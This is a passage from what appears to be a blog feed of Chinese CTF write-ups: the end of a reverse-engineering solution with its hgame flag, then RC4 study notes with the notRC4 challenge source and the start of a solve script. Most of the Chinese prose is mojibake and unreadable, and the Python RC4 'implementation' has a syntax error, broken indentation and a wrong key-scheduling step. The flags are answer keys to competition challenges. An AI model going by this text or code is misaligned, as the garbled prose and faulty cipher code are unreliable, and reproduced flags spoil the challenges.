title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>è¿™ä¸€é“é¢˜æ˜¯è¿è’™å¸¦çŒœçš„ä¸€é“é¢˜ï¼Œæœ¬èº«cppçš„é™æ€åˆ†æå°±å¾ˆéš¾çœ‹ï¼Œå‡ºé¢˜äººè¿˜å»æ‰äº†ç¬¦å·è¡¨ã€‚ï¼ˆè€Œä¸”æœ¬äººè¿˜æ²¡å­¦è¿‡cppï¼Œæ‰€ä»¥è¿™ä¸€é¢˜è®²å¾—ä¸ä¼šå¾ˆæ¸…æ¥šï¼‰</p><p>è‡ªå·±ä¹Ÿæ˜¯åˆšæ¥è§¦äºŒè¿›åˆ¶ï¼ŒåŠ¨æ€è°ƒè¯•ä¹Ÿä¸å¤ªä¼šï¼Œæ‰€ä»¥ã€‚ã€‚ã€‚ã€‚</p><p><img src="https://i.loli.net/2020/05/01/X2CI93SYHnK6zDE.png" alt="img"></p><p>æ‰€ä»¥æˆ‘ä»¬è§£å¯†åªéœ€è¦å…ˆæ±‚å‡ºçŸ©é˜µv21çš„é€†çŸ©é˜µ</p><p>æ¨èä¸€ä¸ªåœ¨çº¿çŸ©é˜µè¿ç®—çš„<a href="https://matrixcalc.org/zh/" target="_blank" rel="noopener">ç½‘ç«™</a></p><p><img src="https://i.loli.net/2020/05/01/sICPQybD3AHehFz.png" alt="img"></p><p>ç„¶åçŸ©é˜µv30å³ä¹˜è¿™ä¸ªçŸ©é˜µå°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬åº”è¯¥çš„è¾“å…¥çŸ©é˜µ</p><p><img src="https://i.loli.net/2020/05/01/q9rdYcfiNSoJG4P.png" alt="img"></p><p>æ‰€ä»¥flagå°±æ˜¯ï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;<span class="number">-24840</span>_<span class="number">-78193</span>_51567_2556_<span class="number">-26463</span>_26729_3608_<span class="number">-25933</span>_25943&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ RC4ä¸SM4</title>
      <link href="/2020/01/30/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BRC4%E4%B8%8ESM4/"/>
      <url>/2020/01/30/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BRC4%E4%B8%8ESM4/</url>
      
        <content type="html"><![CDATA[<h1 id="Rc4"><a href="#Rc4" class="headerlink" title="Rc4"></a>Rc4</h1><p>åœ¨ä»Šå¹´å¯’å‡hgame week2çš„å¯†ç å­¦ä¸­æœ‰ä¸€é“notRC4çš„é¢˜ç›®ï¼Œè¯´æ˜¯notRC4ï¼Œå…¶å®æ•´ä¸ªåŠ å¯†æµç¨‹è¿˜æ˜¯RC4ï¼Œæ‰€ä»¥å€Ÿæ­¤æœºä¼šå­¦ä¹ ä¸€ä¸‹RC4åŠ å¯†ã€‚</p><h2 id="Rc4ç®€ä»‹"><a href="#Rc4ç®€ä»‹" class="headerlink" title="Rc4ç®€ä»‹"></a>Rc4ç®€ä»‹</h2><p>â€‹        åœ¨å¯†ç å­¦ä¸­ï¼ŒRC4ï¼ˆæ¥è‡ªRivest Cipher 4çš„ç¼©å†™ï¼‰æ˜¯ä¸€ç§æµåŠ å¯†ç®—æ³•ï¼Œç”±äºåŠ è§£å¯†ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œå› æ­¤ä¹Ÿå±äºå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚ä½†æ˜¯ç”±äºRC4ç®—æ³•å­˜åœ¨å¼±ç‚¹ï¼Œ2015å¹´2æœˆæ‰€å‘å¸ƒçš„ RFC 7465 è§„å®šç¦æ­¢åœ¨TLSä¸­ä½¿ç”¨RC4åŠ å¯†ç®—æ³•ã€‚</p><p>â€‹        RC4ç”±ä¼ªéšæœºæ•°ç”Ÿæˆå™¨å’Œå¼‚æˆ–è¿ç®—ç»„æˆã€‚RC4çš„å¯†é’¥é•¿åº¦å¯å˜ï¼ŒèŒƒå›´æ˜¯[1,255]ã€‚RC4ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åœ°åŠ è§£å¯†ã€‚ç»™å®šä¸€ä¸ªå¯†é’¥ï¼Œä¼ªéšæœºæ•°ç”Ÿæˆå™¨æ¥å—å¯†é’¥å¹¶äº§ç”Ÿä¸€ä¸ªSç›’ã€‚Sç›’ç”¨æ¥åŠ å¯†æ•°æ®ï¼Œè€Œä¸”åœ¨åŠ å¯†è¿‡ç¨‹ä¸­Sç›’ä¼šå˜åŒ–ã€‚</p><p>ç”±äºå¼‚æˆ–è¿ç®—çš„å¯¹åˆæ€§ï¼ŒRC4åŠ å¯†è§£å¯†ä½¿ç”¨åŒä¸€å¥—ç®—æ³•ã€‚</p><p> 2015å¹´ï¼Œæ¯”åˆ©æ™‚é­¯æ±¶å¤§å­¸çš„ç ”ç©¶äººå“¡Mathy VanhoefåŠFrank Piessensï¼Œå…¬å¸ƒäº†é‡å°RC4åŠ å¯†ç®—æ³•çš„æ–°å‹æ”»æ“Šç¨‹å¼ï¼Œå¯åœ¨75å°æ™‚å…§å–å¾—cookieçš„å…§å®¹ã€‚ </p><h2 id="RC4åŠ å¯†æµç¨‹"><a href="#RC4åŠ å¯†æµç¨‹" class="headerlink" title="RC4åŠ å¯†æµç¨‹"></a>RC4åŠ å¯†æµç¨‹</h2><h3 id="åˆå§‹åŒ–ç®—æ³•ï¼ˆKSAï¼‰"><a href="#åˆå§‹åŒ–ç®—æ³•ï¼ˆKSAï¼‰" class="headerlink" title="åˆå§‹åŒ–ç®—æ³•ï¼ˆKSAï¼‰"></a>åˆå§‹åŒ–ç®—æ³•ï¼ˆKSAï¼‰</h3><p>é¦–å…ˆç”Ÿæˆä¸€ä¸ªkeyï¼Œå†…å®¹éšä¾¿å®šä¹‰</p><p>ç„¶åå°†keyæ‹“å±•æˆ256ä½ï¼Œç”¨keyæœ¬èº«æ¥å¡«å……ï¼Œ</p><p>ä¸¾ä¸ªæ —å­ï¼šå¦‚æœé€‰æ‹©key=â€˜vanishâ€™,æ‹“å±•åçš„keyå³ä¸ºâ€˜vanishvanishvanishâ€¦â€¦vaniâ€™  (é•¿åº¦ä¸º256)</p><p>ç„¶åç”Ÿæˆä¸€ä¸ªSç›’ï¼ŒSç›’æœ‰256ä¸ªå…ƒç´ ï¼Œåˆ†åˆ«æ˜¯0ï¼Œ1ï¼Œ2ï¼Œâ€¦â€¦ï¼Œ255</p><p>æ¥ç€åˆ©ç”¨keyåˆå§‹åŒ–ï¼ˆæ‰“ä¹±ï¼‰Sç›’ï¼Œ</p><p>åˆå§‹åŒ–çš„ä¼ªä»£ç ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">j </span>= <span class="number">0</span></span><br><span class="line">for( i=<span class="number">0</span> <span class="comment">; i&lt;256 ; i++)</span></span><br><span class="line">    <span class="keyword">j </span>= (<span class="keyword">j </span>+ S[i] + key[i]) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">swap </span>(s[i],s[<span class="keyword">j])</span><span class="comment"># äº¤æ¢s[i]å’Œs[j]çš„å€¼ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„Sç›’</span></span><br><span class="line">endfor</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œç”±äºæœªåˆå§‹åŒ–çš„Sç›’éƒ½æ˜¯ç¡®å®šçš„ï¼Œæ‰€ä»¥jå¯ä»¥çœ‹ä½œåªå—keyçš„å€¼çš„å½±å“ï¼Œå¹¶ä¸”jçš„å€¼å…·æœ‰â€œé—ä¼ æ€§â€ï¼Œå°±æ˜¯ä¼šå½±å“åé¢çš„jçš„å€¼ï¼Œæ‰€ä»¥ï¼Œå°±ç®—åªæ˜¯æ”¹åŠ¨keyçš„æŸä¸€ä¸ªå€¼ï¼Œç»è¿‡256æ¬¡å˜åŒ–åçš„Sç›’ä¹Ÿä¼šç”±å¾ˆå¤§ä¸åŒã€‚</p><p>æ•´ä¸ªåˆå§‹åŒ–æŠ½è±¡ä¸€ç‚¹è¿‡ç¨‹å°±æ˜¯ï¼ŒSç›’çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½ä¼šå’Œè‡ªèº«çš„æŸä¸€ä¸ªå…ƒç´ è¿›è¡Œäº¤æ¢ï¼Œè€Œå’Œè°äº¤æ¢åˆ™ç”±keyæ¥å†³å®š</p><h3 id="ä¼ªéšæœºå­å¯†ç ç”Ÿæˆç®—æ³•ï¼ˆPRGA-ã€åŠ å¯†é˜¶æ®µ"><a href="#ä¼ªéšæœºå­å¯†ç ç”Ÿæˆç®—æ³•ï¼ˆPRGA-ã€åŠ å¯†é˜¶æ®µ" class="headerlink" title="ä¼ªéšæœºå­å¯†ç ç”Ÿæˆç®—æ³•ï¼ˆPRGA)ã€åŠ å¯†é˜¶æ®µ"></a>ä¼ªéšæœºå­å¯†ç ç”Ÿæˆç®—æ³•ï¼ˆPRGA)ã€åŠ å¯†é˜¶æ®µ</h3><p>ä¼ªä»£ç ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">j </span>= <span class="number">0</span></span><br><span class="line">for (i=<span class="number">0</span> <span class="comment">;i&lt;len(input);i++):</span></span><br><span class="line">    i = (i + <span class="number">1</span>) mod <span class="number">256</span>  </span><br><span class="line">    <span class="keyword">j </span>= (<span class="keyword">j </span>+ S[i]) mod <span class="number">256</span> <span class="comment">#jçš„å€¼å—Sç›’å½±å“</span></span><br><span class="line">    <span class="keyword">swap </span>(s[i],s[<span class="keyword">j])</span><span class="comment"># äº¤æ¢s[i]å’Œs[j]çš„å€¼ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„Sç›’</span></span><br><span class="line">    k = input[i] ^ S[(S[i] + S[<span class="keyword">j]) </span>% <span class="number">256</span>]<span class="comment">#å¯¹æ˜æ–‡çš„ä¸€ä¸ªå­—èŠ‚è¿›è¡ŒåŠ å¯†</span></span><br><span class="line">    output K</span><br><span class="line">endwhile</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œä¼ªéšæœºçš„å­å¯†ç çš„ç”Ÿæˆåªå—åˆå§‹åŒ–åçš„Sç›’çš„å½±å“ï¼Œè¦åŠ å¯†çš„æ˜æ–‡å¹¶ä¸ä¼šå½±å“å¯†é’¥ã€‚</p><p>ä»è¿™é‡Œä¾¿å¯ä»¥çœ‹å‡ºRC4æ˜¯ä¸€ä¸ªå¯¹ç§°åŠ å¯†ï¼Œåªè¦æ‹¥æœ‰åˆå§‹åŒ–åçš„Sç›’ã€‚é‚£ä¹ˆå¯†é’¥ä¾¿æ˜¯å›ºå®šçš„ã€‚æ˜æ–‡æµå’Œå¯†é’¥æµå¼‚æˆ–å¾—åˆ°å¯†æ–‡æµï¼Œå¯†æ–‡æµå’Œå¯†é’¥æµå¼‚æˆ–ä¾¿å¾—åˆ°æ˜æ–‡æµã€‚</p><h2 id="pythonä»£ç å®ç°ï¼š"><a href="#pythonä»£ç å®ç°ï¼š" class="headerlink" title="pythonä»£ç å®ç°ï¼š"></a>pythonä»£ç å®ç°ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åˆ›å»ºSç›’</span></span><br><span class="line">s=[<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    s[i]=i</span><br><span class="line">    </span><br><span class="line"><span class="comment">#æ‹“å±•key</span></span><br><span class="line">key=<span class="string">""</span></span><br><span class="line">k=[<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    k[i]=key[(i)mod(len(key)]</span><br><span class="line">    </span><br><span class="line"><span class="comment">#åˆå§‹åŒ–Sç›’</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">j = (j+s[i]+s[j])%<span class="number">256</span></span><br><span class="line">    s[i],s[j] = s[j],s[i]</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”Ÿæˆå¯†é’¥ï¼ŒåŠ å¯†æ˜æ–‡  </span></span><br><span class="line">message=<span class="string">""</span> </span><br><span class="line">cipher</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(message))</span><br><span class="line">    i = (i + <span class="number">1</span>)%<span class="number">256</span> </span><br><span class="line">    j = (j + s[i])%<span class="number">256</span></span><br><span class="line">    s[i],s[j] = s[j],s[i]</span><br><span class="line">    t = (s[i] + s[j])%<span class="number">256</span></span><br><span class="line">    cipher += message[i]^s[t]</span><br></pre></td></tr></table></figure><h2 id="å®ä¾‹ï¼šhgame-week2-notRC4"><a href="#å®ä¾‹ï¼šhgame-week2-notRC4" class="headerlink" title="å®ä¾‹ï¼šhgame-week2 notRC4"></a>å®ä¾‹ï¼šhgame-week2 notRC4</h2><p>é¢˜ç›®ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from hashlib import md5</span><br><span class="line">from secret import flag</span><br><span class="line">assert flag.startswith(b<span class="string">'hgame) and flag.endswith(b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Oo0</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.O<span class="number">0</span> = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        <span class="keyword">self</span>.Ooo = <span class="number">0</span></span><br><span class="line">        <span class="keyword">self</span>.Ooo<span class="number">0</span> = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.O<span class="number">0</span>[i] = i</span><br><span class="line">        <span class="keyword">self</span>.oO<span class="number">0</span> = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OO0</span><span class="params">(<span class="keyword">self</span>, oO<span class="number">0</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        l = len(oO<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.Ooo<span class="number">0</span>[i] = oO<span class="number">0</span>[i%l]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.oO<span class="number">0</span> = ( <span class="keyword">self</span>.oO<span class="number">0</span> + <span class="keyword">self</span>.O<span class="number">0</span>[i] + <span class="keyword">self</span>.Ooo<span class="number">0</span>[i] ) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">self</span>.O<span class="number">0</span>[i], <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>] = <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>], <span class="keyword">self</span>.O<span class="number">0</span>[i]</span><br><span class="line">        <span class="keyword">self</span>.Ooo = <span class="keyword">self</span>.oO<span class="number">0</span> = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OO0o</span><span class="params">(<span class="keyword">self</span>, length)</span></span><span class="symbol">:</span></span><br><span class="line">        O = []</span><br><span class="line">        <span class="keyword">for</span> <span class="number">_</span> <span class="keyword">in</span> range(length)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.Ooo = ( <span class="keyword">self</span>.Ooo + <span class="number">1</span> ) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">self</span>.oO<span class="number">0</span> = ( <span class="keyword">self</span>.oO<span class="number">0</span> + <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.Ooo] ) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.Ooo], <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>] = <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>], <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.Ooo]</span><br><span class="line">            t = ( <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.Ooo] + <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>] ) % <span class="number">256</span></span><br><span class="line">            O.append( <span class="keyword">self</span>.O<span class="number">0</span>[t] )</span><br><span class="line">        print(<span class="keyword">self</span>.O<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> O</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(s1, s2)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(map( (lambda <span class="symbol">x:</span> x[<span class="number">0</span>]^x[<span class="number">1</span>]), zip(s1, s2) ))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(msg)</span></span><span class="symbol">:</span></span><br><span class="line">    Oo0oO = Oo<span class="number">0</span>()</span><br><span class="line">    Oo0oO.OO<span class="number">0</span>( md5(msg).digest()[<span class="symbol">:</span><span class="number">8</span>] )</span><br><span class="line">    O0O = Oo0oO.OO0o( len(msg) )</span><br><span class="line">    <span class="keyword">return</span> xor(msg, O0O)</span><br><span class="line"></span><br><span class="line">print( enc(flag) )</span><br><span class="line"></span><br><span class="line"><span class="comment"># [157, 28, 118, 120, 251, 242, 69, 178, 165, 137, 115, 84, 250, 152, 56, 196, 191, 16, 71, 158, 1, 58, 233, 175, 214, 181, 42, 151, 255, 228, 38, 48, 186, 139, 201, 24, 30, 134, 162, 86, 187, 176, 121, 206, 153, 111, 161, 163, 26, 27, 14, 188, 96, 3, 52, 207, 57, 8, 145, 154, 238, 221, 85, 204, 66, 141, 143, 237, 113, 53, 218, 29, 177, 150, 87, 94, 183, 130, 200, 12, 182, 166, 205, 93, 252, 44, 77, 76, 55, 81, 208, 128, 6, 109, 156, 129, 103, 59, 105, 25, 75, 31, 164, 232, 132, 209, 159, 2, 194, 131, 116, 32, 19, 36, 4, 125, 108, 212, 170, 171, 248, 236, 126, 195, 174, 65, 215, 160, 91, 64, 172, 167, 13, 169, 68, 92, 20, 10, 142, 106, 23, 192, 67, 88, 253, 202, 184, 22, 249, 122, 62, 107, 123, 45, 148, 51, 100, 245, 190, 231, 220, 241, 213, 50, 70, 219, 39, 244, 82, 189, 37, 72, 119, 40, 234, 224, 80, 235, 18, 61, 198, 90, 60, 98, 95, 179, 54, 254, 74, 226, 180, 230, 211, 99, 239, 83, 144, 240, 34, 199, 35, 7, 210, 149, 112, 41, 101, 225, 168, 33, 63, 216, 79, 243, 17, 138, 97, 147, 11, 229, 222, 0, 9, 78, 49, 21, 155, 124, 135, 193, 197, 223, 5, 110, 246, 247, 104, 203, 89, 117, 140, 114, 136, 185, 15, 46, 173, 102, 73, 47, 217, 43, 146, 133, 127, 227]</span></span><br><span class="line"><span class="comment"># b'\x14\xe3s,\xcbq\xa8\xd1\x86\x12\xba\x9f\x88\xa9J&#125;\xf5\xd8BF\x93x\x94\x8a\xdc\xdb\xa0\xb9O0SeJ^\xc7\xce\xcf\xe3\x1c\x10s\xe2\xb6\xceA\xfd\xd6\x87\x95W'</span></span><br></pre></td></tr></table></figure><p>ç¨‹åºå¯¹å‡½æ•°ååšäº†ä¸€äº›æ··æ·†ï¼Œæ¢å¤ä¹‹åä¸éš¾çœ‹å‡ºå…¶å®å°±æ˜¯RC4çš„åŠ å¯†æµç¨‹</p><p>åˆ©ç”¨å‰é¢æåˆ°çš„75å°æ—¶ç ´è§£RC4çš„æ”»å‡»æ–¹æ³•ç ´è§£æ˜æ–‡æ˜¾ç„¶ä¸ä¼šæ˜¯é¢˜ç›®çš„æœ¬æ„ï¼Œæ¯•ç«Ÿé‚£æ–¹æ³•è§£å¯†çš„æ—¶é—´æ˜¯ä»¥å°æ—¶ä¸ºå•ä½çš„ã€‚</p><p>å¯ä»¥å‘ç°ï¼Œæœ¬é¢˜ä¸ä»…ç»™å‡ºäº†å¯†æ–‡ï¼Œè¿˜ç»™å‡ºäº†åŠ å¯†å®Œæˆä¹‹åSç›’çš„å†…å®¹ï¼Œçªç ´ç‚¹æ— ç–‘æ˜¯è¿™é‡Œäº†ã€‚</p><h3 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h3><p>æˆ‘ä»¬çœ‹åˆ°RC4æœ€åçš„åŠ å¯†ç®—æ³•éƒ¨åˆ†</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(len(message))</span><br><span class="line">    <span class="built_in">i</span> = (<span class="built_in">i</span> + <span class="number">1</span>)<span class="comment">%256 </span></span><br><span class="line">    <span class="built_in">j</span> = (<span class="built_in">j</span> + s[<span class="built_in">i</span>])<span class="comment">%256</span></span><br><span class="line">    s[<span class="built_in">i</span>],s[<span class="built_in">j</span>] = s[<span class="built_in">j</span>],s[<span class="built_in">i</span>]</span><br><span class="line">    t = (s[<span class="built_in">i</span>] + s[<span class="built_in">j</span>])<span class="comment">%256</span></span><br><span class="line">    cipher += message[<span class="built_in">i</span>]^s[t]</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥ç¡®å®šçš„æ˜¯ï¼ŒRC4æ—¢ç„¶æ˜¯æŒ‰å­—èŠ‚åŠ å¯†ã€‚é‚£ä¹ˆæ˜æ–‡å’Œå¯†æ–‡çš„é•¿åº¦ä¾¿æ˜¯ä¸€è‡´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¾¿å¯ä»¥ç¡®å®šåŠ å¯†éƒ¨åˆ†ç»è¿‡äº†å‡ æ¬¡å¾ªç¯ã€‚</p><p>å…¶æ¬¡ï¼Œä¸å¸¸è§„è§£å¯†ä¸åŒçš„æ˜¯ï¼Œæˆ‘ä»¬æ˜¾ç„¶çŸ¥é“flagçš„æœ€åä¸€ä½å­—ç¬¦æ˜¯â€™}â€™,ç”±äºå¼‚æˆ–è¿ç®—çš„å¯¹åˆæ€§ï¼Œæˆ‘ä»¬å¼‚æˆ–å¯†æ–‡å’Œæ˜æ–‡çš„æœ€åä¸€ä½ï¼Œä¾¿å¯ä»¥å¾—åˆ°å¯†é’¥çš„æœ€åä¸€ä½ï¼Œï¼ˆå…¶å®å°±ç®—æœ€åä¸€ä½å­—ç¬¦ä¸ç¡®å®šï¼Œä¹Ÿæ˜¯å¯ä»¥æš´åŠ›éå†ä¸€ç™¾å¤šç§å¯èƒ½ï¼Œæ‰¾åˆ°å…¶ä¸­æœ‰æ„ä¹‰çš„å³å¯ï¼‰</p><p>çŸ¥é“å¯†é’¥çš„æœ€åä¸€ä½ï¼Œå³s[t]ï¼Œæˆ‘ä»¬å†æ ¹æ®æœ€åç»™å‡ºçš„Sç›’å°±èƒ½ç¡®å®štçš„å€¼ï¼Œ</p><p>æˆ‘ä»¬è¿˜çŸ¥é“içš„å€¼å°±ä»£è¡¨ç€å¾ªç¯çš„æ¬¡æ•°ï¼Œæ‰€ä»¥içš„å€¼ä¹Ÿæ˜¯ç¡®å®šçš„ã€‚</p><p> <strong>t = (s[i] + s[j])%256</strong>ï¼šSç›’ç¡®å®šï¼Œiç¡®å®šï¼Œtç¡®å®šï¼Œå› æ­¤jä¹Ÿæ˜¯å¯ä»¥æ¨å‡ºæ¥ã€‚</p><p>æ¨å‡ºjåï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œswap(s[i],[j])ï¼Œå°†Sç›’å˜å›å»ã€‚</p><p><strong>j = (j + s[i])%256</strong>ï¼šjæ¨å‡ºæ¥åï¼Œs[i]æ˜¯ç¡®å®šçš„ï¼Œæˆ‘ä»¬å°±èƒ½ç¡®å®šä¸Šä¸€è½®çš„jçš„å€¼</p><p>ç¡®å®šäº†ä¸Šä¸€è½®çš„jçš„å€¼ï¼Œiçš„å€¼ä¹Ÿæ˜¯ç¡®å®šçš„ï¼Œ<strong>t = (s[i] + s[j])%256</strong>ï¼Œè¿™æ ·å°±èƒ½ç¡®å®štçš„å€¼ï¼Œä»è€Œç¡®å®šs[t]ï¼Œå³å¯†é’¥çš„å€¼ï¼Œæœ‰äº†å¯†é’¥å°±èƒ½è§£å¯†å¯†æ–‡ï¼Œæ¨å‡ºæ˜æ–‡äº†ã€‚</p><p>ç„¶åå†åˆ©ç”¨s[i]ï¼Œä¸æ–­çš„æ¨å‡ºå‰é¢çš„jï¼Œå°±èƒ½ä¸æ–­çš„å€’æ¨å‡ºæ˜æ–‡äº†ã€‚æœ€åå°†æ˜æ–‡é€†åºä¸€ä¸‹ï¼Œå°±æ˜¯flagäº†ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">enc=<span class="string">b'\x14\xe3s,\xcbq\xa8\xd1\x86\x12\xba\x9f\x88\xa9J&#125;\xf5\xd8BF\x93x\x94\x8a\xdc\xdb\xa0\xb9O0SeJ^\xc7\xce\xcf\xe3\x1c\x10s\xe2\xb6\xceA\xfd\xd6\x87\x95W'</span></span><br><span class="line">s= [<span class="number">157</span>, <span class="number">28</span>, <span class="number">118</span>, <span class="number">120</span>, <span class="number">251</span>, <span class="number">242</span>, <span class="number">69</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">137</span>, <span class="number">115</span>, <span class="number">84</span>, <span class="number">250</span>, <span class="number">152</span>, <span class="number">56</span>, <span class="number">196</span>, <span class="number">191</span>, <span class="number">16</span>, <span class="number">71</span>, <span class="number">158</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">233</span>, <span class="number">175</span>, <span class="number">214</span>, <span class="number">181</span>, <span class="number">42</span>, <span class="number">151</span>, <span class="number">255</span>, 